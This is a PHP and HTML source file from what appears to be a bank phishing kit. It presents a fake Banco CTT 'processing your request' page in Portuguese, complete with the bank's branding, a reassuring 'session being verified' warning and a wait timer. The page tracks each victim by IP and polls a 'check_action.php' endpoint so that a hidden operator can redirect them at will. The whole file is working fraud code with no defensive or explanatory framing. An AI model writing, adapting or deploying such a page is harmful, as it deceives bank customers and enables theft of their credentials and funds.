<?php
// ============================================================
//  loading.php — Waiting page that polls for admin action
//  
// ============================================================
require_once 'config.php';

$ip = client_ip();
$state = get_state($ip);

// If admin already set a destination, redirect immediately
$dest = consume_action($ip);
if ($dest) {
    header('Location: ' . $dest);
    exit;
}

// Default to global redirect after long wait
$settings = get_settings();
?>
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>A processar | Banco CTT Online</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{
    font-family:"Segoe UI","Segoe",Tahoma,Helvetica,Arial,sans-serif;
    font-size:13px;
    color:#444;
    background:#f4f4f4;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:20px;
}
.page{width:100%;max-width:480px}
.card{
    background:#fff;
    border-radius:6px;
    box-shadow:0 2px 14px rgba(0,0,0,0.08);
    overflow:hidden;
}
.brand-bar{
    background:#df0024;
    color:#ffffff;
    text-align:center;
    padding:8px 12px;
    font-size:11px;
    font-weight:700;
    letter-spacing:0.4px;
    text-transform:uppercase;
}
.logo-area{
    padding:30px 30px 14px;
    text-align:center;
    background:#fff;
}
.logo-area img{height:30px}
.logo-area .logo-fallback{
    font-size:20px;
    font-weight:700;
    color:#222222;
}
.body{
    padding:20px 30px 36px;
    background:#fff;
    text-align:center;
}
.spinner{
    width:48px;
    height:48px;
    border:4px solid #e1e1e1;
    border-top-color:#df0024;
    border-radius:50%;
    animation:spin 0.8s linear infinite;
    margin:0 auto 18px;
}
@keyframes spin{to{transform:rotate(360deg)}}
h2{
    font-size:15px;
    color:#222222;
    font-weight:600;
    margin-bottom:6px;
}
p{
    font-size:12px;
    color:#666;
    line-height:1.5;
    margin-bottom:6px;
}
.warn{
    margin-top:14px;
    padding:9px 12px;
    background:#fdecef;
    border:1px solid #f5b8c3;
    border-radius:3px;
    font-size:11px;
    color:#8c0017;
}
.timer{
    margin-top:14px;
    font-size:10px;
    color:#aaa;
    font-family:Consolas,monospace;
}
@media(max-width:520px){
    .body{padding:18px 22px 30px}
    .logo-area{padding:24px 22px 10px}
}
</style>
</head>
<body>
<div class="page">
    <div class="card">
        <div class="brand-bar">A Processar o Pedido</div>

        <div class="logo-area">
            <img src="https://thebanks.eu/img/logos/Banco_CTT.png" alt="Banco CTT" onerror="this.outerHTML='<span class=&quot;logo-fallback&quot;>Banco CTT</span>'">
        </div>

        <div class="body">
            <div class="spinner"></div>
            <h2>A Processar o Pedido</h2>
            <p>Aguarde, por favor. A sua operação está a ser processada.</p>
            <p>Não feche nem atualize esta página.</p>

            <div class="warn">
                ⚠ Por motivos de segurança, a sua sessão está a ser verificada automaticamente.
            </div>

            <div class="timer" id="timer">Tempo de espera: 0 segundos</div>
        </div>
    </div>
</div>

<script>
(function(){
    var timerEl = document.getElementById('timer');
    var seconds = 0;
    setInterval(function(){
        seconds++;
        var label = (seconds === 1) ? 'segundo' : 'segundos';
        timerEl.textContent = 'Tempo de espera: ' + seconds + ' ' + label;
    }, 1000);

    // Poll every 2 seconds for admin action
    function poll(){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'check_action.php?t=' + Date.now(), true);
        xhr.setRequestHeader('Cache-Control', 'no-cache');
        xhr.onreadystatechange = function(){
            if (xhr.readyState !== 4) return;
            if (xhr.status !== 200) {
                setTimeout(poll, 3000);
                return;
            }
            try {
                var resp = JSON.parse(xhr.responseText);
                if (resp.redirect) {
                    if (resp.delay && resp.delay > 0) {
                        document.querySelector('.body').innerHTML = 
                            '<div style="font-size:34px;color:#2e7d32;margin-bottom:14px">✓</div>' +
                            '<h2>Verificação Bem-sucedida</h2>' +
                            '<p>Será redirecionado automaticamente em ' + resp.delay + ' segundos...</p>';
                        setTimeout(function(){
                            window.location.href = resp.redirect;
                        }, resp.delay * 1000);
                    } else {
                        window.location.href = resp.redirect;
                    }
                } else {
                    setTimeout(poll, 2000);
                }
            } catch(err) {
                setTimeout(poll, 3000);
            }
        };
        xhr.send();
    }
    setTimeout(poll, 1500);
})();
</script>
</body>
</html>